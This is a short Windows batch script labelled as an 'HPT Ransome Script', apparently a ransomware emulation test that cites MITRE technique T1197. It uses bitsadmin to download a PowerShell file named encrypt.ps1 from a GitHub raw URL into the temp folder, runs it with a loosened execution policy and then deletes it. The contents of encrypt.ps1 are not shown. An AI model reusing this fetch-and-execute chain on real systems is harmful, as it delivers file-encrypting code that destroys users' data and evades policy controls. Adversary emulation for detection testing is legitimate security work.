@ECHO OFF
echo **********************************************
echo *          HPT Ransome Script                *
echo *          Version: 0.1                      *
echo *          author: hsoc                      *
echo *                                            *
echo **********************************************

pause

echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] T1197 - Bitsadmin Download executable file
echo %time% %date% [+++++++++++++++++++++++++++++++++++++++++] Run encryption
bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/dunghoangtrong/hsoc-demo/master/encrypt.ps1 %temp%\encrypt.ps1
start "" cmd /c powershell -executionpolicy remotesigned -File %temp%\encrypt.ps1

pause
echo Cleanup Testing
del %temp%\encrypt.ps1
echo Finished Testing

